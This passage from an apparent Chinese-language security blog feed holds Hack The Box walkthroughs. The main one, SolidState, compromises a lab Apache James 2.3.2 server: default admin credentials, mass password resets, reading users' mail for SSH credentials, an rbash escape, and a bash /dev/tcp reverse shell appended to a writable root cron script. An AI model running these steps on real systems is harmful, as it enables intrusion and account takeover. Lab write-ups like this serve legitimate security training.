class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.4] from (UNKNOWN) [10.10.11.133] 55666<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@mosa-pod:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>我尝试查找root.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@mosa-pod:/<span class="hljs-comment"># find / -name root.txt</span><br>find: File system loop detected; <span class="hljs-string">&#x27;/host/var/lib/docker/overlay2/74c1cf237c3f1666cfd71a7f54a2263ea73bf931e5fdc8b4db43d76007062980/merged&#x27;</span> is part of the same file system loop as <span class="hljs-string">&#x27;/&#x27;</span>.<br>/host/root/root.txt<br>find: <span class="hljs-string">&#x27;/host/proc/1/map_files&#x27;</span>: Permission denied<br>find: <span class="hljs-string">&#x27;/host/proc/2/map_files&#x27;</span>: Permission denied<br>find: <span class="hljs-string">&#x27;/host/proc/3/map_files&#x27;</span>: Permission denied<br>root@mosa-pod:/<span class="hljs-comment"># cat /host/root/root.txt</span><br>113....................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - SolidState</title>
    <link href="/post/HackTheBox-SolidState.html"/>
    <url>/post/HackTheBox-SolidState.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/SolidState.png" alt="SolidState"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.51<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-30 06:04:41 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 4555/tcp on 10.10.10.51                                   <br>Discovered open port 22/tcp on 10.10.10.51                                     <br>Discovered open port 110/tcp on 10.10.10.51                                    <br>Discovered open port 25/tcp on 10.10.10.51                                     <br>Discovered open port 119/tcp on 10.10.10.51                                    <br>Discovered open port 80/tcp on 10.10.10.51     <br>CrazyInSide:~/HackTheBox$ <span class="hljs-built_in">cat</span> SolidState <br><span class="hljs-comment"># Nmap 7.92SVN scan initiated Tue Aug 30 14:08:28 2022 as: nmap -sC -sV -p4555,22,110,25,119,80 -oN SolidState 10.10.10.51</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.51<br>Host is up (0.16s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)<br>|   256 78b83af660190691f553921d3f48ed53 (ECDSA)<br>|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)<br>25/tcp   open  smtp    JAMES smtpd 2.3.2<br>|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.4 [10.10.16.4])<br>80/tcp   open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-title: Home - Solid State Security<br>|_http-server-header: Apache/2.4.25 (Debian)<br>110/tcp  open  pop3    JAMES pop3d 2.3.2<br>|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br>|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br>|_sslv2: ERROR: Script execution failed (use -d to debug)<br>|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br>|_ssl-<span class="hljs-built_in">date</span>: ERROR: Script execution failed (use -d to debug)<br>119/tcp  open  nntp    JAMES nntpd (posting ok)<br>|_ssl-<span class="hljs-built_in">date</span>: ERROR: Script execution failed (use -d to debug)<br>|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br>|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br>|_sslv2: ERROR: Script execution failed (use -d to debug)<br>|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br>4555/tcp open  rsip?<br>| fingerprint-strings: <br>|   GenericLines: <br>|     JAMES Remote Administration Tool 2.3.2<br>|     Please enter your login and password<br>|     Login <span class="hljs-built_in">id</span>:<br>|     Password:<br>|     Login failed <span class="hljs-keyword">for</span> <br>|_    Login <span class="hljs-built_in">id</span>:<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://ParrotOS.org/cgi-bin/submit.cgi?new-service :<br>SF-Port4555-TCP:V=7.92SVN%I=7%D=8/30%Time=630DA969%P=x86_64-unknown-linux-<br>SF:gnu%r(GenericLines,7C,<span class="hljs-string">&quot;JAMES\x20Remote\x20Administration\x20Tool\x202\.</span><br><span class="hljs-string">SF:3\.2\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:</span><br><span class="hljs-string">SF:\nPassword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&quot;</span>);<br>Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br><span class="hljs-comment"># Nmap done at Tue Aug 30 14:12:35 2022 -- 1 IP address (1 host up) scanned in 246.92 seconds</span><br></code></pre></td></tr></table></figure><p>25端口运行的这个应用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ searchsploit JAMES            <br>------------------------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                                        |  Path<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>Apache James Server 2.2 - SMTP Denial of Service                                                      | multiple/dos/27915.pl<br>Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                  | linux/remote/48130.rb<br>Apache James Server 2.3.2 - Remote Command Execution                                                  | linux/remote/35513.py<br>Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                        | linux/remote/50347.py<br>WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                                   | windows/remote/944.c<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br> Paper Title                                                                                          |  Path<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br>Exploiting Apache James Server 2.3.2                                                                  | docs/english/40123-exploiting-ap<br>------------------------------------------------------------------------------------------------------ ---------------------------------<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; search Apache James<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                      Disclosure Date  Rank    Check  Description</span><br>   -  ----                                      ---------------  ----    -----  -----------<br>   0  exploit/linux/smtp/apache_james_exec      2015-10-01       normal  Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write<br>   1  auxiliary/scanner/http/log4shell_scanner  2021-12-09       normal  No     Log4Shell HTTP Scanner<br><br><br>Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/log4shell_scanner<br><br>msf6 &gt; use 0<br>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(linux/smtp/apache_james_exec) &gt; show options <br><br>Module options (exploit/linux/smtp/apache_james_exec):<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   ADMINPORT  4555             <span class="hljs-built_in">yes</span>       Port <span class="hljs-keyword">for</span> James remote administration tool<br>   PASSWORD   root             <span class="hljs-built_in">yes</span>       Root password <span class="hljs-keyword">for</span> James remote administration tool<br>   POP3PORT   110              no        Port <span class="hljs-keyword">for</span> POP3 Apache James Service<br>   RHOSTS                      <span class="hljs-built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT      25               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   SRVHOST    0.0.0.0          <span class="hljs-built_in">yes</span>       The <span class="hljs-built_in">local</span> host or network interface to listen on. This must be an address on the <span class="hljs-built_in">local</span> machin<br>                                         e or 0.0.0.0 to listen on all addresses.<br>   SRVPORT    8080             <span class="hljs-built_in">yes</span>       The <span class="hljs-built_in">local</span> port to listen on.<br>   SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL <span class="hljs-keyword">for</span> incoming connections<br>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)<br>   URIPATH                     no        The URI to use <span class="hljs-keyword">for</span> this exploit (default is random)<br>   USERNAME   root             <span class="hljs-built_in">yes</span>       Root username <span class="hljs-keyword">for</span> James remote administration tool<br><br><br>Payload options (linux/x64/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.1.3      <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   1   Cron<br><br><br>msf6 exploit(linux/smtp/apache_james_exec) &gt; <br></code></pre></td></tr></table></figure><p>端口号这些是都对得上的，但是用户名与密码或许不可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(linux/smtp/apache_james_exec) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.4:4444 <br>[*] 10.10.10.51:25 - Command Stager progress - 100.00% <span class="hljs-keyword">done</span> (833/833 bytes)<br>[*] 10.10.10.51:25 - Waiting <span class="hljs-keyword">for</span> cron to execute payload...<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(linux/smtp/apache_james_exec) &gt; <br></code></pre></td></tr></table></figure><p>确实不行。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830144035803.png" alt="image-20220830144035803"></p><p>4555端口浏览器访问把我浏览器里一些HTTP头自动当成输入数据提交了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ nc 10.10.10.51 4555     <br>JAMES Remote Administration Tool 2.3.2<br>Please enter your login and password<br>Login <span class="hljs-built_in">id</span>:<br>root<br>Password:<br>root<br>Welcome root. HELP <span class="hljs-keyword">for</span> a list of commands<br><span class="hljs-built_in">help</span><br>Currently implemented commands:<br><span class="hljs-built_in">help</span>                                    display this <span class="hljs-built_in">help</span><br>listusers                               display existing accounts<br>countusers                              display the number of existing accounts<br>adduser [username] [password]           add a new user<br>verify [username]                       verify <span class="hljs-keyword">if</span> specified user exist<br>deluser [username]                      delete existing user<br>setpassword [username] [password]       sets a user<span class="hljs-string">&#x27;s password</span><br><span class="hljs-string">setalias [user] [alias]                 locally forwards all email for &#x27;</span>user<span class="hljs-string">&#x27; to &#x27;</span><span class="hljs-built_in">alias</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">showalias [username]                    shows a user&#x27;</span>s current email <span class="hljs-built_in">alias</span><br>unsetalias [user]                       unsets an <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;user&#x27;</span><br>setforwarding [username] [emailaddress] forwards a user<span class="hljs-string">&#x27;s email to another email address</span><br><span class="hljs-string">showforwarding [username]               shows a user&#x27;</span>s current email forwarding<br>unsetforwarding [username]              removes a forward<br>user [repositoryname]                   change to another user repository<br>shutdown                                kills the current JVM (convenient when James is run as a daemon)<br>quit                                    close connection<br></code></pre></td></tr></table></figure><p>root:root明明可以的啊，为啥不成功呢。我可以遍历用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">listusers<br>Existing accounts 6<br>user: james<br>user: ../../../../../../../../etc/bash_completion.d<br>user: thomas<br>user: john<br>user: mindy<br>user: mailadmin<br></code></pre></td></tr></table></figure><p>把密码都改了，第二个用户名为什么是一个路径我也不知道：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">setpassword james crazyinside<br>Password <span class="hljs-keyword">for</span> james reset<br>setpassword thomas crazyinside<br>Password <span class="hljs-keyword">for</span> thomas reset<br>setpassword john crazyinside<br>Password <span class="hljs-keyword">for</span> john reset<br>setpassword mindy crazyinside<br>Password <span class="hljs-keyword">for</span> mindy reset<br>setpassword mailadmin crazyinside<br>Password <span class="hljs-keyword">for</span> mailadmin reset<br></code></pre></td></tr></table></figure><p>在mindy邮箱里有两封邮件，其中一封包含一个用户名口令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ telnet 10.10.10.51 110<br>Trying 10.10.10.51...<br>Connected to 10.10.10.51.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready <br>USER mindy<br>+OK<br>PASS crazyinside<br>+OK Welcome mindy<br>LIST<br>+OK 2 1945<br>1 1109<br>2 836<br>.<br>RETR 1<br>+OK Message follows<br>Return-Path: &lt;mailadmin@localhost&gt;<br>Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=us-ascii<br>Content-Transfer-Encoding: 7bit<br>Delivered-To: mindy@localhost<br>Received: from 192.168.11.142 ([192.168.11.142])<br>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798<br>          <span class="hljs-keyword">for</span> &lt;mindy@localhost&gt;;<br>          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)<br>Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)<br>From: mailadmin@localhost<br>Subject: Welcome<br><br>Dear Mindy,<br>Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical <span class="hljs-keyword">in</span> fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will <span class="hljs-built_in">help</span> you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.<br><br>We are looking forward to you joining our team and your success at Solid State Security. <br><br>Respectfully,<br>James<br>.<br>RETR 2<br>+OK Message follows<br>Return-Path: &lt;mailadmin@localhost&gt;<br>Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=us-ascii<br>Content-Transfer-Encoding: 7bit<br>Delivered-To: mindy@localhost<br>Received: from 192.168.11.142 ([192.168.11.142])<br>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581<br>          <span class="hljs-keyword">for</span> &lt;mindy@localhost&gt;;<br>          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)<br>Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)<br>From: mailadmin@localhost<br>Subject: Your Access<br><br>Dear Mindy,<br><br><br>Here are your ssh credentials to access the system. Remember to reset your password after your first login. <br>Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. <br><br>username: mindy<br>pass: P@55W0rd1!2@<br><br>Respectfully,<br>James<br><br>.<br><br></code></pre></td></tr></table></figure><p>可以被用来登录ssh，但是是限制级的shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">Message-ID: &lt;8375593.0.1661772097524.JavaMail.root@solidstate&gt;<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=us-ascii<br>Content-Transfer-Encoding: 7bit<br>Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost<br>Received: from 10.10.14.18 ([10.10.14.18])<br>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 632<br>          <span class="hljs-keyword">for</span> &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;<br>          Mon, 29 Aug 2022 07:20:57 -0400 (EDT)<br>Date: Mon, 29 Aug 2022 07:20:57 -0400 (EDT)<br>From: team@team.pl<br><br>: No such file or directory<br>-rbash: $<span class="hljs-string">&#x27;\r&#x27;</span>: <span class="hljs-built_in">command</span> not found<br>mindy@solidstate:~$ <br></code></pre></td></tr></table></figure><p>很好绕：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sshpass -p <span class="hljs-string">&#x27;P@55W0rd1!2@&#x27;</span> ssh mindy@10.10.10.51 -t bash<br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <span class="hljs-built_in">ls</span><br>bin  user.txt<br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <span class="hljs-built_in">id</span><br>uid=1001(mindy) gid=1001(mindy) <span class="hljs-built_in">groups</span>=1001(mindy)<br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <span class="hljs-built_in">cat</span> user.txt <br>839631b6a847fb2415f9764adb415a7b<br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <br></code></pre></td></tr></table></figure><p>在&#x2F;opt&#x2F;下有一个计划任务脚本，root会定时的去运行该脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="hljs-built_in">ls</span><br>james-2.3.2  tmp.py<br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="hljs-built_in">cat</span> tmp.py <br><span class="hljs-comment">#!/usr/bin/env python</span><br>import os<br>import sys<br>try:<br>     os.system(<span class="hljs-string">&#x27;nc 10.10.14.18 4242&#x27;</span>)<br>except:<br>     sys.exit()<br><br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="hljs-built_in">ls</span> -all tmp.py <br>-rwxrwxrwx 1 root root 111 Aug 29 09:35 tmp.py<br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <br></code></pre></td></tr></table></figure><p>并且该脚本是可写的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;os.system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/1337 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&gt;&gt;tmp.py <br><span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="hljs-built_in">cat</span> tmp.py <br><span class="hljs-comment">#!/usr/bin/env python</span><br>import os<br>import sys<br>try:<br>     os.system(<span class="hljs-string">&#x27;nc 10.10.14.18 4242&#x27;</span>)<br>except:<br>     sys.exit()<br><br>os.system(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/1337 0&gt;&amp;1&quot;&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ nc -lvnp 1337           <br>listening on [any] 1337 ...<br>connect to [10.10.16.4] from (UNKNOWN) [10.10.10.51] 57460<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (6567): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@solidstate:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>root.txt<br>root@solidstate:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>ad68d5.............................<br>root@solidstate:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - shocker</title>
    <link href="/post/HackTheBox-Shocker.html"/>
    <url>/post/HackTheBox-Shocker.html</url>
    
    <content type="html"><![CDATA[<h3 id="HTB-Walkthrough-shocker"><a href="#HTB-Walkthrough-shocker" class="headerlink" title="HTB Walkthrough - shocker"></a>HTB Walkthrough - shocker</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 14:26 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.56<br>Host is up (0.44s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="hljs-string">| ssh-hostkey: </span><br><span class="hljs-string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span><br><span class="hljs-string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span><br><span class="hljs-string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds</span><br></code></pre></td></tr></table></figure><p>页面很简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 